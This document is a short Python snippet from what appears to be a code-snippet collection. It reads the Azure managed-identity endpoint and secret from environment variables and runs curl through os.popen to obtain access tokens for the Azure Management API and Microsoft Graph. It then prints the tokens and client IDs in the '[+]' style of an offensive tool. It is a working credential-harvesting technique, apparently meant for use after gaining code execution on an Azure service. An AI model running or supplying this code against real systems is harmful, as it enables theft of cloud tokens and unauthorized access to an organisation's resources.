---
id: 4af20b77-3e81-4dc0-9fa5-c8ba3557f61d
type: code
language: py
verified: false
created_at: '2023-04-06T03:56:15.220523+00:00'
updated_at: '2023-05-24T16:02:35.210415+00:00'
---

# Code Snippet 4af20b77

**Language**: py

```py
IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

print("[+] Management API")
cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])

print("\r\n[+] Graph API")
cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print(json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])
```


